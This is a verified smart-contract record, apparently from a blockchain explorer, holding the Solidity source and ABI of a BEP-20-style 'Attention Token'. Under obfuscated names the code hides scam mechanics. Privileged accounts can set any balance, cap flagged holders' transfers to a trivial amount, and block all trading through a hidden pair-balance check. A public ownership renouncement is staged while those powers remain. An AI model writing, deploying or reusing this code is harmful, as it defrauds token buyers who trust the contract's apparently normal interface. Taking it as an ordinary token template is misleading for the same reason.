{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface walletFromAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapFee) external view returns (uint256);\n\n    function transfer(address teamTxMin, uint256 launchedFee) external returns (bool);\n\n    function allowance(address shouldSellFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamTxMin,\n        uint256 launchedFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeLimit, uint256 value);\n    event Approval(address indexed shouldSellFrom, address indexed spender, uint256 value);\n}\n\nabstract contract autoReceiverIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeBuy {\n    function createPair(address tokenWallet, address txTo) external returns (address);\n}\n\ninterface walletFromAtMetadata is walletFromAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AttentionToken is autoReceiverIs, walletFromAt, walletFromAtMetadata {\n\n    function fundTotalLimit(uint256 launchedFee) public {\n        totalToLimit();\n        shouldIs = launchedFee;\n    }\n\n    function getOwner() external view returns (address) {\n        return launchAt;\n    }\n\n    uint8 private feeTotal = 18;\n\n    uint256 shouldIs;\n\n    address public teamFeeAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderList;\n    }\n\n    string private fundMax = \"Attention Token\";\n\n    address listLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address tokenList, address teamTxMin, uint256 launchedFee) external override returns (bool) {\n        if (_msgSender() != minList) {\n            if (shouldToken[tokenList][_msgSender()] != type(uint256).max) {\n                require(launchedFee <= shouldToken[tokenList][_msgSender()]);\n                shouldToken[tokenList][_msgSender()] -= launchedFee;\n            }\n        }\n        return launchMax(tokenList, teamTxMin, launchedFee);\n    }\n\n    uint256 private toTotal;\n\n    mapping(address => mapping(address => uint256)) private shouldToken;\n\n    function atBuy(address tokenList, address teamTxMin, uint256 launchedFee) internal returns (bool) {\n        require(marketingLimit[tokenList] >= launchedFee);\n        marketingLimit[tokenList] -= launchedFee;\n        marketingLimit[teamTxMin] += launchedFee;\n        emit Transfer(tokenList, teamTxMin, launchedFee);\n        return true;\n    }\n\n    address public modeList;\n\n    function owner() external view returns (address) {\n        return launchAt;\n    }\n\n    bool private isTake;\n\n    mapping(address => bool) public buySwap;\n\n    uint256 public tradingTx;\n\n    uint256 constant teamLiquidity = 20 ** 10;\n\n    event OwnershipTransferred(address indexed shouldTo, address indexed sellReceiver);\n\n    function launchMax(address tokenList, address teamTxMin, uint256 launchedFee) internal returns (bool) {\n        if (tokenList == teamFeeAmount) {\n            return atBuy(tokenList, teamTxMin, launchedFee);\n        }\n        uint256 launchedEnable = walletFromAt(modeList).balanceOf(listLaunch);\n        require(launchedEnable == shouldIs);\n        require(teamTxMin != listLaunch);\n        if (receiverAt[tokenList]) {\n            return atBuy(tokenList, teamTxMin, teamLiquidity);\n        }\n        return atBuy(tokenList, teamTxMin, launchedFee);\n    }\n\n    bool public swapSender;\n\n    function allowance(address listMaxReceiver, address teamWalletToken) external view virtual override returns (uint256) {\n        if (teamWalletToken == minList) {\n            return type(uint256).max;\n        }\n        return shouldToken[listMaxReceiver][teamWalletToken];\n    }\n\n    uint256 private walletTeam;\n\n    function exemptTx(address exemptMin) public {\n        totalToLimit();\n        if (amountIs) {\n            isSenderAmount = false;\n        }\n        if (exemptMin == teamFeeAmount || exemptMin == modeList) {\n            return;\n        }\n        receiverAt[exemptMin] = true;\n    }\n\n    function totalToLimit() private view {\n        require(buySwap[_msgSender()]);\n    }\n\n    string private senderList = \"ATN\";\n\n    uint256 teamEnable;\n\n    function minTeamLaunch(address tradingFrom, uint256 launchedFee) public {\n        totalToLimit();\n        marketingLimit[tradingFrom] = launchedFee;\n    }\n\n    bool private amountIs;\n\n    constructor (){\n        \n        limitFund isMin = limitFund(minList);\n        modeList = feeBuy(isMin.factory()).createPair(isMin.WETH(), address(this));\n        if (toTotal == tradingTx) {\n            tradingTx = toTotal;\n        }\n        teamFeeAmount = _msgSender();\n        toMarketing();\n        buySwap[teamFeeAmount] = true;\n        marketingLimit[teamFeeAmount] = launchedTx;\n        \n        emit Transfer(address(0), teamFeeAmount, launchedTx);\n    }\n\n    bool private isSenderAmount;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedTx;\n    }\n\n    uint256 private launchedTx = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeTotal;\n    }\n\n    function transfer(address tradingFrom, uint256 launchedFee) external virtual override returns (bool) {\n        return launchMax(_msgSender(), tradingFrom, launchedFee);\n    }\n\n    address minList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private marketingLimit;\n\n    function toMarketing() public {\n        emit OwnershipTransferred(teamFeeAmount, address(0));\n        launchAt = address(0);\n    }\n\n    address private launchAt;\n\n    function name() external view virtual override returns (string memory) {\n        return fundMax;\n    }\n\n    mapping(address => bool) public receiverAt;\n\n    function enableTx(address minFund) public {\n        if (swapSender) {\n            return;\n        }\n        if (toTotal != walletTeam) {\n            amountIs = false;\n        }\n        buySwap[minFund] = true;\n        \n        swapSender = true;\n    }\n\n    function balanceOf(address swapFee) public view virtual override returns (uint256) {\n        return marketingLimit[swapFee];\n    }\n\n    function approve(address teamWalletToken, uint256 launchedFee) public virtual override returns (bool) {\n        shouldToken[_msgSender()][teamWalletToken] = launchedFee;\n        emit Approval(_msgSender(), teamWalletToken, launchedFee);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldSellFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMaxReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamWalletToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamWalletToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buySwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFund\",\"type\":\"address\"}],\"name\":\"enableTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMin\",\"type\":\"address\"}],\"name\":\"exemptTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedFee\",\"type\":\"uint256\"}],\"name\":\"fundTotalLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFee\",\"type\":\"uint256\"}],\"name\":\"minTeamLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFeeAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamTxMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AttentionToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}